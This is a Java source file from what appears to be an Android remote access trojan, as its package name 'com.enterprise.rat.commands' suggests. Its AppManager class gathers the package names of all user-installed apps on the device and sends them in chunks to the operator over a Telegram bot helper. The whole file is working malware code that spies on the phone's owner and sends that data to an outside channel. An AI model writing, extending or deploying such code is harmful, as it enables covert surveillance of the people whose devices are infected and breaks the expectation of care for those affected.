package com.enterprise.rat.commands;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import com.enterprise.rat.utils.TelegramApi;
import java.util.List;

public class AppManager {
    private Context context;

    public AppManager(Context context) { this.context = context; }

    public void listInstalledApps() {
        PackageManager pm = context.getPackageManager();
        List<PackageInfo> packages = pm.getInstalledPackages(0);
        StringBuilder sb = new StringBuilder("<b>📦 Installed Apps:</b>\n\n");
        
        for (PackageInfo p : packages) {
            if ((p.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                sb.append("🔹 <code>").append(p.packageName).append("</code>\n");
            }
            if (sb.length() > 3800) {
                TelegramApi.sendMessage(sb.toString());
                sb.setLength(0);
            }
        }
        if (sb.length() > 0) TelegramApi.sendMessage(sb.toString());
    }
}
